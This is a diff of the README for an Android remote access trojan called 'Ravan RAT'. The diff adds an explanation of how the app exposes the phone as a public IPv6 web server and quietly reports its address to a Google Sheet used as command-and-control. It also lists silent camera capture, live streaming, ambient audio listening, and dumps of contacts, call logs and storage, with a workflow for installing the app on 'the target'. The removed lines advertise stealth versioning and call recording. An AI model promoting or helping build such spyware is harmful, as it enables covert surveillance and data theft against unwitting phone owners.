@@ -60,55 +60,49 @@ chmod +x build.sh
 
 ---
 
-## ✨ What It Can Do
+## 🧠 The Core Concept: Direct IPv6 Access
+
+**"Why do I need a server? Wait, I don't!"**
+
+During security research, we discovered a fascinating behavior in modern Android networking. When an Android device connects to mobile data (and many modern WiFi networks), it is assigned a **Public IPv6 Address**.
+
+Unlike IPv4, which is heavily NAT'd (Network Address Translation) and requires complex Port Forwarding to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.
+
+### How Ravan RAT Exploits This:
+
+1.  **Local HTTP Server**: The app starts a lightweight HTTP server on the Android device (Port 8080).
+2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the IP address in your browser. No router config, no firewall bypass, no NGROK.
+3.  **The Problem (Dynamic IPs)**: Mobile networks rotate IPs frequently. Your target's IP changes every time they reconnect.
+4.  **The Solution (Google Sheet)**: We use a simple Google Sheet as a **"Command & Control" (C2)** tracker. The app detects its own Public IPv6 and quietly posts it to your Google Sheet. You open the sheet, click the link, and you are connected directly to the device.
+
+> **TL;DR**: We turn the Android phone into a public web server and use Google Sheets as a dynamic phonebook to find it.
+
+---
+
+## ✨ Features
 
 **Device Access**
 
-- 📁 File Manager - Browse & download files
-- 📞 Call Logs - View call history
-- 👥 Contacts - Access saved contacts
-- 📱 Device Info - System details
+- 📁 **File Manager**: Browsable directory of the entire phone storage.
+- 📞 **Call Logs**: Read-only view of recent calls.
+- 👥 **Contacts**: Dump of local contacts.
+- 📱 **Device Info**: Battery, Model, Android Version.
 
-**Camera**
+**Surveillance**
 
-- 📸 Photo Capture - Front/back camera
-- 🎥 Live Stream - Real-time view
-- ⏺️ Video Recording
-
-**Audio**
-
-- 🎤 Mic Recording - Ambient audio
-- 📞 Call Recording - Auto record calls
-- ⚙️ Settings - Toggle auto-record
-
-**Web Panel**
-
-- 🌐 Access from any browser
-- 📱 Works on phone/PC
-- 🔄 Real-time updates
+- 📸 **Remote Camera**: Trigger front/back camera to take silent photos.
+- 🎥 **Live Stream**: Watch a low-latency MJPEG stream from the device.
+- 🎤 **Audio**: Listen to ambient background noise.
 
 ---
 
-## 📋 How It Works
+## 📋 usage Workflow
 
-1. Build APK using builder scripts
-2. Install on Android device
-3. Grant permissions
-4. Start server
-5. Open the IPv6 URL in browser
-6. Control device remotely
-
----
-
-## 🛠️ Builder Features
-
-- ✅ Auto Java check/install
-- ✅ Keystore generation (Auto & Manual)
-- ✅ Custom App Name & Package Name
-- ✅ **Random Version Generation** (Stealth)
-- ✅ **Advanced Logo Processing** (Resize & Transparent)
-- ✅ Google Sheet webhook with clickable links
-- ✅ One-click build (Signed + Unsigned)
+1.  **Build & Install**: Create the APK using the builder and install it on the target.
+2.  **The Link**: The app will automatically POST its location to your Google Sheet.
+    - _Example_: `http://[2409:4052:2e1b:bd68:xxxx:xxxx:xxxx:xxxx]:8080`
+3.  **Connect**: Click the link in your Google Sheet.
+4.  **Control**: You will see the Ravan Web Panel running **directly on the phone**. All commands sent go straight to the device, and data comes straight back to you. P2P at its finest.
 
 ---
 
